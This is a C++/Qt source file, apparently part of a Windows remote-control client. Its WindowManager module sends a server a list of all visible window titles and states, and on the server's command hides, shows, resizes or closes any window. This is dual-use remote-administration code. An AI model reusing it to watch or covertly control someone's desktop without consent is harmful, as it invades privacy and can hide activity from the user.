#include "windowmanager.h"

WindowManager::WindowManager(TcpClient *TClient, QObject *parent) :AbsManager(TClient)
{
    qDebug() << "a Window Manager is created";
    connect(m_client,&TcpClient::connected,this,[=](){
        emit logMessage("[WindowManager] 客户端已与服务器连接");
        qDebug()<<"[WindowManager] 客户端已与服务器连接";
        m_client->SendReply(WINDOW_REPLY);
        Sleep(500);
        SendClientWindowList();
    });
}

WindowManager::~WindowManager()
{

}

void WindowManager::HandlePacket(const PACKET &pkt)
{
    qDebug()<<"window manager is handeling……";
    switch(pkt.isToken)
    {
    case WINDOW_REFRESH_REQUIRE:
        SendClientWindowList();
        break;
    case WINDOW_CLOSE_REQUIRE:
    case WINDOW_HIDE_REQUIRE:
    case WINDOW_MAX_REQUIRE:
    case WINDOW_MIN_REQUIRE:
    case WINDOW_RESTORE_REQUIRE:
        ControlWindow(pkt.payload);
        break;
    default:
        qDebug()<<"unknown istoken:"<<pkt.isToken;
        break;
    }
}


void WindowManager::SendClientWindowList()
{
    PACKET pkt;
    pkt.isToken = WINDOW_OPERATION_REPLY;
    QDataStream out(&pkt.payload,QIODevice::WriteOnly);
    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
        QDataStream* out = reinterpret_cast<QDataStream*>(lParam);

        if (!IsWindowVisible(hwnd)) return TRUE;

        char title[512] = {0};
        GetWindowTextA(hwnd, title, sizeof(title));
        if (strlen(title) == 0) return true;

        QString state;
        if (!IsWindowVisible(hwnd)) {
            state = "隐藏";
        } else if (IsIconic(hwnd)) {
            state = "最小化";
        } else if (IsZoomed(hwnd)) {
            state = "最大化";
        } else {
            state = "显示";
        }

        *out << (quint64)(quintptr)hwnd;  // HWND 强转为 64 位整数
        *out << QString::fromLocal8Bit(title);
        *out << state;

        return true;
    }, (LPARAM)&out);
    qDebug()<<"[WindowManager] send size:"<<pkt.payload.size();
    m_client->SendData(pkt);
}

void WindowManager::ControlWindow(const QByteArray &payload)
{
    if(payload.size() < sizeof(HWND) + sizeof(DWORD))
    {
        qDebug()<<"[WindowManager] invalid payload size";
        return;
    }

    QDataStream stream(payload);
    quint64 hwnd;
    quint32 subkey;
    stream>> hwnd >> subkey;

    //HWND hwnd = (HWND)(uintptr_t) hwndval;
    switch(subkey)
    {
    case SW_HIDE:
    case SW_SHOW:
    case SW_SHOWMAXIMIZED:
    case SW_SHOWMINIMIZED:
    case SW_RESTORE:
        ShowWindow((HWND)(uintptr_t)hwnd, (DWORD)subkey);
        break;
    case WM_CLOSE:
        PostMessage((HWND)(uintptr_t)hwnd, WM_CLOSE, 0, 0);
        break;
    default:
        qDebug() << "[WindowManager] Unknown Subkey:" << subkey;
        break;
    }
    Sleep(200);
    SendClientWindowList();
}

